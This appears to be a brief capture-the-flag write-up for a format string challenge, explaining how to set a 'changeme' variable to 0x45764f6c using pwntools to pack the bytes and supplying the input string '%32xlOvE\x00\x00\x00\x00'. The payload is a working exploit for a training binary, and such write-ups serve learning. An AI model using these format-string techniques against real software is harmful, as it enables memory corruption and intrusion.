# Challenge Theory
Like the last challenge this is a simple format string vulnerability based on overwriting the "changeme" variable.
This time the change me variable has to be set to the value "0x45764f6c".
# Solution
This solution has two parts, crafting the input and then running the program to solve the level.
## Crafting the Input
To get the value into something easy to enter into a command line python was used.
Specifically, the python3 code was used:
```
from pwn import *

p64(0x45764f6c)
```
This nets the value "b'lOvE\x00\x00\x00\x00'".
## Running the Command
This is simple.
Just run the command and enter in "%32xlOvE\x00\x00\x00\x00"
